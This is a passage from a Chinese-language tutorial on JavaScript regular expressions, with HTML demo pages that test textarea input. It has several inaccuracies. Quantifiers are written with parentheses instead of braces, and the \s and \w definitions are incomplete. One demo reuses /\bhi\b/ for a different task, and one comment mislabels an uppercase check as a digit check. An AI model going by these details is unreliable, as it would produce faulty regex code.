    <content type="html"><![CDATA[<h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><h3 id="1-1-正则表达式的web常见场合"><a href="#1-1-正则表达式的web常见场合" class="headerlink" title="1.1 正则表达式的web常见场合"></a>1.1 正则表达式的web常见场合</h3><ul><li>邮箱验证</li><li>用户名验证</li><li>替换字符串某一部分</li><li>信息采集 用来分析有效的代码段</li></ul><h3 id="1-2-字符串应用正则"><a href="#1-2-字符串应用正则" class="headerlink" title="1.2 字符串应用正则"></a>1.2 字符串应用正则</h3><ul><li><code>string.match(reg)</code>正则查找字符串 </li><li><code>string.search(reg)</code> 正则查找位置</li><li><code>string.replace(reg,&#39;newstr&#39;)</code>正则替换</li><li><code>string.split（reg）</code>正则拆分</li></ul><h3 id="1-3-正则表达式3句话"><a href="#1-3-正则表达式3句话" class="headerlink" title="1.3 正则表达式3句话"></a>1.3 正则表达式3句话</h3><h4 id="1-3-1-要找什么字符？（5中方法）"><a href="#1-3-1-要找什么字符？（5中方法）" class="headerlink" title="1.3.1 要找什么字符？（5中方法）"></a>1.3.1 要找什么字符？（5中方法）</h4><ul><li>字面值 比如：<code>hi</code>就是找<code>hi</code></li><li>字符的集合<code>[abcd]</code>匹配<code>abdc</code>任意一个</li><li>用范围来表示字符<code>[0-9] [a-z][A-Z]</code></li><li>字符簇 就是系统为常用的字符集合创建的一个简写<ul><li>例如：<code>\d</code> 表示<code>[0-9]</code> <code>\w</code>代表<code>[0-9a-zA-Z_]</code>  <code>\s</code>代表<code>[\t\v\f\r\n]</code>（空白符）</li></ul></li><li>补集的形式来表示字符集合<ul><li>例如：<code>[0-9]</code> 补集 <code>[^0-9]</code></li><li>对于字符簇只需把字母大写即可表示补集 <code>\d</code> –&gt;<code>\D</code>（非数字）  <code>\w</code>–&gt;<code>\W</code> （代表<code>a-z0-9A-Z</code>之外的东西） <code>\s</code> –&gt;<code>\S</code>(代表非空白字符)</li></ul></li><li>点代表 任意字符 (不包括换行符)</li></ul><h4 id="1-3-2-从哪里找-找到哪？"><a href="#1-3-2-从哪里找-找到哪？" class="headerlink" title="1.3.2 从哪里找,找到哪？"></a>1.3.2 从哪里找,找到哪？</h4><ul><li><code>\b</code>单词边界  <code>\bhi</code>从单词边界开始匹配<code>hi</code></li><li><code>\B</code> 单词的非边界 把单词的中间某一部分取出来  把中间含有hi的单词取出来 即<code>hi</code>不能再两端</li><li><code>^</code> 从字符串的起始位置开始匹配</li><li><code>$</code>匹配到字符串的额结束位置</li></ul><h4 id="1-3-3-找多少"><a href="#1-3-3-找多少" class="headerlink" title="1.3.3 找多少"></a>1.3.3 找多少</h4><ul><li><code>*</code>表示匹配<code>0-</code>无穷<code>==</code>等价<code>(0,)</code></li><li><code>+</code>表示匹配<code>1-</code>无穷 <code>==</code>等价<code>(1,)</code></li><li><code>?</code>表示<code>[0,1] ==</code> 等价<code>(0,1)</code></li><li><code>a(n)</code>: 字符a准确出<code>现n</code>次</li><li><code>a(n,)</code>:字符<code>a</code>至少出现<code>n</code>次</li><li><code>a(n,m):n</code>到<code>m</code>次</li></ul><h3 id="1-3-贪婪模式"><a href="#1-3-贪婪模式" class="headerlink" title="1.3 贪婪模式"></a>1.3 贪婪模式</h3><ul><li>个数修饰符默认是贪婪模式 尽量多找</li><li>是指在上面的个数修饰符后面加<code>?</code>，则为非贪婪模式，尽量少的找</li></ul><p><strong>模式</strong>：</p><ul><li>以匹配为例默认情况 match找到一次就结束 能否告诉匹配过程 一直找 在全文范围内一直找</li><li><code>g</code> 表示全局模式 global  找所有的  而不是就找一行就结束</li><li><code>i</code> ignore 忽略大小写</li><li><code>s</code> 单行模式（把整篇文章看成一行）js不支持单行模式</li><li><code>m</code> 多行模式</li></ul><h2 id="二、语法"><a href="#二、语法" class="headerlink" title="二、语法"></a>二、语法</h2><h3 id="2-1-基本元字符"><a href="#2-1-基本元字符" class="headerlink" title="2.1 基本元字符"></a>2.1 基本元字符</h3><ul><li><code>.</code> ： 匹配除了换行符之外的任何单个字符</li><li><code>\</code> ： 在非特殊字符之前的反斜杠表示下一个字符是特殊的</li><li><code>|</code>： 逻辑或操作符</li><li><code>[]</code> ：定义一个字符集合，匹配字符集合中的一个字符，在字符集合里面像 <code>.</code>，\这些字符都表示其本身</li><li><code>[^]</code>：对上面一个集合取非</li><li><code>-</code>：定义一个区间，例如<code>[A-Z]</code>，其首尾字符在 <code>ASCII</code> 字符集里面</li></ul><h3 id="2-2-数量元字符"><a href="#2-2-数量元字符" class="headerlink" title="2.2 数量元字符"></a>2.2 数量元字符</h3><ul><li><code>{m,n}</code> ：匹配前面一个字符至少 <code>m</code> 次至多 <code>n</code> 次重复，还有<code>{m}</code>表示匹配 <code>m</code> 次，<code>{m,}</code>表示至少 <code>m</code> 次</li><li><code>+</code> ： 匹配前面一个表达式一次或者多次，相当于<code>{1,}</code>，记忆方式追加<code>(+)</code>，起码得有一次</li><li><code>*</code> ： 匹配前面一个表达式零次或者多次，相当于<code>{0,}</code>，记忆方式乘法<code>(*)</code>，可以一次都没有</li><li><code>?</code> ： 单独使用匹配前面一个表达式零次或者一次，相当于 <code>{0,1}</code></li></ul><h3 id="2-3-位置元字符"><a href="#2-3-位置元字符" class="headerlink" title="2.3 位置元字符"></a>2.3 位置元字符</h3><ul><li><code>^</code> ： 单独使用匹配表达式的开始</li><li><code>\$</code>： 匹配表达式的结束</li><li><code>\b</code>：匹配单词边界</li><li><code>\B</code>：匹配非单词边界</li><li><code>(?=p)</code>：匹配 <code>p</code> 前面的位置</li><li><code>(?!p)</code>：匹配不是 <code>p</code> 前面的位置</li></ul><h3 id="2-4-特殊元字符"><a href="#2-4-特殊元字符" class="headerlink" title="2.4 特殊元字符"></a>2.4 特殊元字符</h3><ul><li><code>\d</code>：<code>[0-9]</code>，表示一位数字，记忆方式 digit</li><li><code>\D</code>：<code>[^0-9]</code>，表示一位非数字</li><li><code>\s</code>：<code>[\t\v\n\r\f]</code>，表示空白符，包括空格，水平制表符（\t），垂直制表符（\v），换行符（\n），回车符（\r），换页符（\f），记忆方式 space character</li><li><code>\S</code>：<code>[^\t\v\n\r\f]</code>，表示非空白符</li><li><code>\w</code>：<code>[0-9a-zA-Z]</code>，表示数字大小写字母和下划线，记忆方式 word</li><li><code>\W</code>：<code>[^0-9a-zA-Z]</code>，表示非单词字符</li></ul><h3 id="2-5-标志字符"><a href="#2-5-标志字符" class="headerlink" title="2.5 标志字符"></a>2.5 标志字符</h3><ul><li><code>g</code> : 全局搜索 记忆方式global</li><li><code>i</code> ：不区分大小写 记忆方式 ignore</li><li><code>m</code> ：多行搜索</li></ul><h2 id="三、match，test，exec，search的返回值"><a href="#三、match，test，exec，search的返回值" class="headerlink" title="三、match，test，exec，search的返回值"></a>三、match，test，exec，search的返回值</h2><h3 id="3-1-match的用法"><a href="#3-1-match的用法" class="headerlink" title="3.1 match的用法"></a>3.1 match的用法</h3><p><strong>在不加全局“g”的情况下</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> str=<span class="string">"wo shi zhong guo ren"</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(str.match(<span class="regexp">/o/</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回的结果是：["o", index: 1, input: "wo shi zhong guo ren"]；</span></span><br></pre></td></tr></table></figure><p><strong>在加全局“g”的情况下</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> str=<span class="string">"wo shi zhong guo ren"</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(str.match(<span class="regexp">/o/g</span>));</span><br><span class="line"></span><br><span class="line">返回的结果是：[<span class="string">"o"</span>, <span class="string">"o"</span>, <span class="string">"o"</span>]；</span><br></pre></td></tr></table></figure><h3 id="3-2-exec的用法"><a href="#3-2-exec的用法" class="headerlink" title="3.2 exec的用法"></a>3.2 exec的用法</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> str=<span class="string">"wo shi zhong guo ren"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> re=<span class="regexp">/o/</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(re.exec(str));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回的结果是：["o", index: 1, input: "wo shi zhong guo ren"]；</span></span><br><span class="line"><span class="comment">// exec返回的和match不加全局“g”’一样</span></span><br></pre></td></tr></table></figure><h3 id="3-3-test的用法"><a href="#3-3-test的用法" class="headerlink" title="3.3 test的用法"></a>3.3 test的用法</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> str=<span class="string">"wo shi zhong guo ren"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> re=<span class="regexp">/o/</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(re.test(str));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回的结果是：true（如果找不到返回的则是false）</span></span><br></pre></td></tr></table></figure><h3 id="3-4-search的用法"><a href="#3-4-search的用法" class="headerlink" title="3.4 search的用法"></a>3.4 search的用法</h3><ul><li>关于search用法其实很简单，它和indexOf是一样的，就是找到index，而且是从前往后数的。</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> str=<span class="string">"wo shi zhong guo ren"</span>;</span><br><span class="line"><span class="keyword">var</span> re=<span class="regexp">/o/</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(str.search(re));</span><br><span class="line"></span><br><span class="line">返回的结果是：<span class="number">1</span>；</span><br></pre></td></tr></table></figure><h2 id="四、应用"><a href="#四、应用" class="headerlink" title="四、应用"></a>四、应用</h2><h3 id="4-1-例1"><a href="#4-1-例1" class="headerlink" title="4.1 例1"></a>4.1 例1</h3><blockquote><p>在线演示 <a href="https://codepen.io/poetries/pen/xWMRxR" target="_blank" rel="noopener">https://codepen.io/poetries/pen/xWMRxR</a></p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>正则-例子1<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">textarea&#123;</span></span><br><span class="line"><span class="undefined">width: 400px;</span></span><br><span class="line"><span class="undefined">height: 200px; </span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">id</span>=<span class="string">'cont'</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"匹配hi"</span> <span class="attr">onclick</span>=<span class="string">"t1();"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"正匹配单词hi"</span> <span class="attr">onclick</span>=<span class="string">"t2();"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"匹配hi开头的单词但不是hi"</span> <span class="attr">onclick</span>=<span class="string">"t3();"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">t1</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cont = <span class="built_in">document</span>.getElementById(<span class="string">'cont'</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cv = cont.value;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> reg = <span class="regexp">/hi/</span>;<span class="comment">//仅仅是看字符串中有没有hi</span></span></span><br><span class="line"><span class="javascript">            alert(reg.test(cv));<span class="comment">//满足 返回true  不满足 返回false</span></span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">t2</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cont = <span class="built_in">document</span>.getElementById(<span class="string">'cont'</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cv = cont.value;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> reg = <span class="regexp">/\bhi\b/</span>;<span class="comment">//正则测试单词hi</span></span></span><br><span class="line"><span class="javascript">            alert(reg.test(cv));<span class="comment">//满足 返回true  不满足 返回false</span></span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">t3</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cont = <span class="built_in">document</span>.getElementById(<span class="string">'cont'</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cv = cont.value;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> reg = <span class="regexp">/\bhi\b/</span>;<span class="comment">//正则测试hi开头的单词但不是hi</span></span></span><br><span class="line"><span class="javascript">            alert(reg.test(cv));<span class="comment">//满足 返回true  不满足 返回false</span></span></span><br><span class="line"><span class="undefined">            &#125; </span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="4-2-例2-要找什么字符串"><a href="#4-2-例2-要找什么字符串" class="headerlink" title="4.2 例2-要找什么字符串"></a>4.2 例2-要找什么字符串</h3><blockquote><p>在线演示 <a href="https://codepen.io/poetries/pen/oqmYNw" target="_blank" rel="noopener">https://codepen.io/poetries/pen/oqmYNw</a></p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>要找什么字符<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">    textarea&#123;</span></span><br><span class="line"><span class="undefined">    width: 400px;</span></span><br><span class="line"><span class="undefined">    height: 200px; </span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">id</span>=<span class="string">'cont'</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"找不好的数字"</span> <span class="attr">onclick</span>=<span class="string">"t1();"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"有没有数字"</span> <span class="attr">onclick</span>=<span class="string">"t2();"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"有没有大写字母"</span> <span class="attr">onclick</span>=<span class="string">"t3();"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"是否全为数字"</span> <span class="attr">onclick</span>=<span class="string">"t4();"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">t1</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cont = <span class="built_in">document</span>.getElementById(<span class="string">'cont'</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cv = cont.value;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> reg = <span class="regexp">/[347]/</span>;<span class="comment">// 匹配347任意一个字符的集合[abcd] 匹配abdc任意一个</span></span></span><br><span class="line"><span class="undefined">            alert(reg.test(cv));</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">t2</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cont = <span class="built_in">document</span>.getElementById(<span class="string">'cont'</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cv = cont.value;</span></span><br><span class="line"><span class="javascript">            <span class="comment">//var reg = /[0123456789]/;</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">//var reg = /[0-9]/;// 匹配有没有数字</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> reg = <span class="regexp">/\d/</span>;<span class="comment">// \d 表示[0-9]</span></span></span><br><span class="line"><span class="undefined">            alert(reg.test(cv));</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">t3</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cont = <span class="built_in">document</span>.getElementById(<span class="string">'cont'</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cv = cont.value;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> reg = <span class="regexp">/[A-Z]/</span>;<span class="comment">// 匹配有没有数字</span></span></span><br><span class="line"><span class="undefined">            alert(reg.test(cv));</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">t4</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cont = <span class="built_in">document</span>.getElementById(<span class="string">'cont'</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cv = cont.value;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> reg = <span class="regexp">/[^0-9]/</span>;<span class="comment">// 匹配非数字 0-9之外的字符  对于网上发布手机号之类的很有用 比如1300 把00换成OO 就没法认出</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">if</span>(reg.test(cv))&#123;</span></span><br><span class="line"><span class="javascript">            alert(<span class="string">'有非数字存在'</span>);</span></span><br><span class="line"><span class="javascript">            &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="javascript">            alert(<span class="string">'全是数字'</span>);</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="4-3-例3-从哪里开始匹配"><a href="#4-3-例3-从哪里开始匹配" class="headerlink" title="4.3 例3-从哪里开始匹配"></a>4.3 例3-从哪里开始匹配</h3><blockquote><p>在线演示 <a href="https://codepen.io/poetries/pen/jzdVOo" target="_blank" rel="noopener">https://codepen.io/poetries/pen/jzdVOo</a></p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>74-从哪里开始匹配<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">textarea&#123;</span></span><br><span class="line"><span class="undefined">width: 400px;</span></span><br><span class="line"><span class="undefined">height: 200px;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">id</span>=<span class="string">'cont'</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"匹配hi"</span> <span class="attr">onclick</span>=<span class="string">"t1();"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"匹配hi开头及hi开头的单词"</span> <span class="attr">onclick</span>=<span class="string">"t2();"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"匹配hi开头的单词但不是hi"</span> <span class="attr">onclick</span>=<span class="string">"t3();"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"匹配进行时的单词"</span> <span class="attr">onclick</span>=<span class="string">"t4();"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"匹配un前缀的反义词"</span> <span class="attr">onclick</span>=<span class="string">"t5();"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"匹配单词中间的hi部分"</span> <span class="attr">onclick</span>=<span class="string">"t6();"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span 